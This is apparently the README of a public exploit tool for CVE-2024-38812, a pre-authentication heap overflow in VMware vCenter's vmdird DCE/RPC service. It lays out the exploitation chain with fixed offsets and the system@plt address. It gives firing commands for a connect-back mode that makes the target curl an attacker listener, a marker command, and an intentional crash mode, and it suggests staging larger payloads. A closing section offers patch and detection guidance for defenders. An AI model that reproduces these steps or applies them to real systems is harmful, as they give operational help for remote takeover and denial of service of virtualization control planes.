# VMWARE TORPEDO — CVE-2024-38812

**Unauthenticated, network-only remote code execution against VMware vCenter Server's directory service (`vmdird`) over DCE/RPC. (Only Version 7)**

No login. No information leak. No address oracle. No allocator tuning. One build-constant, one fixed PLT address, and a naval fire-control theme because research should be fun.

```
                          V M W A R E   T O R P E D O
                               CVE-2024-38812

                                      |
                                   ___|___
                                  /  _ _  \
                                 |  |_|_|  |
                            _____|_________|_____
                   ________/______________________\____________________
              ____/    ___                         \__  --------  \___ `--._
        _____/        /   \___________________________\_____/=====> \     `-.
  <===( O )          |   [01]    [02]    [03]    [04]              |       >
       \______________\_____________________________________________/   _.-'
        `-._                                                        _.-'
            `---..____________________________________________..---'

                    vmdird DCE/RPC  |  pre-auth RCE
```

---

## Authorized use only

This tool fires memory-corruption overflows at a live service. A failed shot **crashes a hypervisor control-plane daemon** — that is a denial of service against production infrastructure.

Run it **only** against systems you own or are explicitly contracted to test under **written authorization and an agreed Rules of Engagement (ROE)**. All examples in this repository use RFC 1918 / RFC 5737 (`192.0.2.0/24`) and `example.com` placeholders by design.

You are responsible for your own use of this code. The author accepts no liability for damage, outage, or misuse.

---

## What this is

`vmware_torpedo.py` is a weaponized proof-of-concept for **CVE-2024-38812**, a CVSS 9.8 pre-auth heap overflow in `libdcerpc.so`, the DCE/RPC runtime (derived from Likewise Open / OSF DCE 1.1) shared by vCenter's `vmdird`, `vmcad`, and `vmafdd` daemons. The CVE is on the [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) list with confirmed in-the-wild exploitation, but no public **no-login RCE** PoC existed at the time of release.

**Full technical writeup:** *[The Bug That Reads and Writes: Reverse-Engineering vCenter's DCE/RPC Heap Overflow](https://medium.com/@cihananthony/the-bug-that-reads-and-writes-reverse-engineering-vcenters-dce-rpc-heap-overflow-cve-2024-38812-499d03187858?sharedUserId=cihananthony)*.

---

## Why it works (the short version)

CVE-2024-38812 is one missing bound. The NDR conformant-varying-array interpreter multiplies an **unvalidated wire field (`lower`)** straight into a `memcpy` destination:

```c
array_addr += element_size * range_list->lower;   // lower is attacker-controlled, unbounded
```

That yields a **controlled-offset, controlled-size, controlled-data relative heap write**, pre-authentication. This tool turns that write into code execution using two properties of the shipping build:

1. **`system@plt` is at a fixed address** — `vmdird` is non-PIE (`ET_EXEC`) and imports `system()`, so ASLR never moves it (`0x41AA80` on VCSA 7.0 U3p, build 22837322).
2. **The exploitation displacement is a build-constant** — for a fixed groom recipe (120 partial-PDU fragbufs + 12 warm-up requests), the NDR-allocation → co-located-fragbuf offset is `lower = 0x820`, derivable **offline from the shipping build**, not a per-target secret. ASLR only shifts the absolute arena base; the *relative* offset is invariant.

### The chain

```
groom N partial-PDU fragbufs (0x1050 chunks; dealloc callback at +0x18) in front of the NDR alloc
   → warm the firing connection so its executor settles on that fragbuf-rich arena
      → the CVE-2024-38812 relative write overwrites a co-located fragbuf's +0x18 callback
        with system@plt, and stages the command string at fragbuf+0x00 (the RDI argument)
         → closing the groom connections frees the fragbuf
            → (*(fragbuf+0x18))(fragbuf) == system(command)
```

---

## Requirements

- Python **3.7+** (standard library only — no third-party dependencies)
- Network reachability to the target's `vmdird` DCE/RPC port (**TCP/2012**)
- For `--mode connectback`: a listener you control, reachable from the target

---

## Install

```bash
git clone https://github.com/Hann1bl3L3ct3r/VMwareTorpedo.git
cd vmware-torpedo
chmod +x vmware_torpedo.py
```

---

## Usage

### Connect-back (self-verifying, recommended)

The warhead becomes `curl HOST:PORT`. Stand up a listener; the target's own inbound request is self-authenticating proof of code execution.

```bash
# On your box (the listener):
nc -lvnp 4444

# Fire:
./vmware_torpedo.py --target 192.0.2.10 --mode connectback --callback 192.0.2.5:4444
```

An inbound connection to your listener = confirmed hit.

### Marker mode (arbitrary command)

Fire a short command and verify its effect out-of-band yourself.

```bash
./vmware_torpedo.py -t 192.0.2.10 --mode marker -c 'id>/tmp/pwn'
```

> **Payload limit:** the command must be **≤ 23 ASCII bytes with no NUL** (it has to fit before the callback slot at `fragbuf+0x18`). For anything larger, land a small stager and pull the real payload down.

### Depth-charge reset (`--crash`) — intentional DoS

The build-constant is only valid against a **fresh** arena. Repeated grooming of one target slowly drifts the displacement (server-side `CLOSE-WAIT` buildup). `--crash` fires **one** out-of-region write to fault the daemon, then waits for `lwsmd` to auto-restart a fresh instance in which `lower = 0x820` is valid again.

```bash
./vmware_torpedo.py -t 192.0.2.10 --mode connectback --callback 192.0.2.5:4444 --crash
```

> **This is a deliberate denial of service.** Each reset takes the directory/SSO service down for ~1.5–3 s and writes an up-to-2 GB core dump. It fires **exactly once per shot** on purpose — `lwsmd`'s autorestart throttle hard-stops the service after ~2 consecutive crashes (needs a login to clear). Lab / explicit-DoS-ROE / maintenance-window use **only**.

---

## Options

| Flag | Default | Description |
|---|---|---|
| `--target`, `-t` | *(required)* | vCenter appliance IP/host |
| `--port`, `-p` | `2012` | `vmdird` DCE/RPC port |
| `--mode` | `connectback` | `connectback` (warhead = `curl` to `--callback`) or `marker` (`--command`) |
| `--callback` | — | Connect-back `HOST:PORT` (required for `connectback`) |
| `--command`, `-c` | `id>/tmp/pwn` | Command for `marker` mode (≤ 23 ASCII bytes, no NUL) |
| `--lower` | `0x820` | Build-constant displacement/2 (for groom=120 / warm=12) |
| `--system-plt` | `0x41aa80` | Fixed non-PIE `system@plt` |
| `--groom` | `120` | Partial-PDU groom connections |
| `--warm` | `12` | Warm-up requests on the firing connection |
| `--attempts`, `-n` | `3` | Paced salvos (~75 %/shot → >98 % at 3; keep small to avoid self-degrade) |
| `--delay` | `1.5` | Seconds between salvos |
| `--crash` | off | **Intentional DoS**: depth-charge reset to a fresh instance before each shot |
| `--crash-lower` | `0x1000000` | Out-of-region displacement/2 used to fault the daemon for `--crash` |
| `--restart-timeout` | `60` | Seconds to wait for a fresh restart after `--crash` |
| `--no-banner` | off | Suppress the ASCII banner |
| `--no-color` | off | Disable ANSI color in log output |
| `--verbose`, `-v` | off | Debug logging |

---

## Reliability

- **~75 % first-shot** against a fresh target across independent instances and ASLR layouts.
- **Misses are benign** — a wrong-phase write lands in fragbuf *data*, not metadata, so the daemon survives. This is why a few paced shots (`-n 3`) exceed **98 %**.
- **Don't hammer one target.** Sustained grooming drifts the displacement and drops the sustained rate. Prefer a small `--attempts` per fresh/clean target, or use `--crash` (where ROE permits) to reset between shots.

### Scope of validation

Validated against **VCSA 7.0 U3p (build 22837322)** on a self-owned lab appliance. The default `--lower` / `--system-plt` are specific to that build — rederive them for other builds. Reliability figures are measured against freshly-restarted lab appliances; a continuously-loaded production appliance's baseline arena state is an untested variable that may shift the recipe.

---

## For defenders

If you run vCenter, the exploit's failure modes are loud and cheap to bound:

- **Patch to 7.0 U3t (build 24322018) or later.** The initial September fix (U3s) was incomplete per Broadcom; U3t is the complete remediation.
- **Detect:** rapid growth of `/storage/core/core.{vmdird,vmcad,vmafdd}.*` and repeated watchdog/`lwsmd` respawns in `/var/log/vmware/<daemon>/` are near-unambiguous indicators of exploitation attempts.
- **Bound the DoS:** the crash-loop meltdown is `/storage/core` exhaustion (2 GB cores starving the supervisor's restart), **not** persistent corruption — the service recovers once the partition is cleared. Cap/rotate core dumps for the RPC daemons, or give them a dedicated size-capped core partition.
- **Segment** the management-plane RPC endpoints (2012/2014/2020) away from anything an attacker can reach. These are unauthenticated endpoints doing memory-unsafe parsing.

---

## References

- VMSA-2024-0019 (CVE-2024-38812), VMSA-2024-0012 (CVE-2024-37079/37080)
- CISA KEV catalog entry for CVE-2024-38812
- Companion writeup: *The Bug That Reads and Writes* (Medium)
- Upstream lineage: Likewise Open / PBIS (BeyondTrust AD Bridge), OSF DCE 1.1 RPC runtime

---

## License

Released for security research and education. Provided **as-is, without warranty**. Use only within authorized scope. See `LICENSE`.
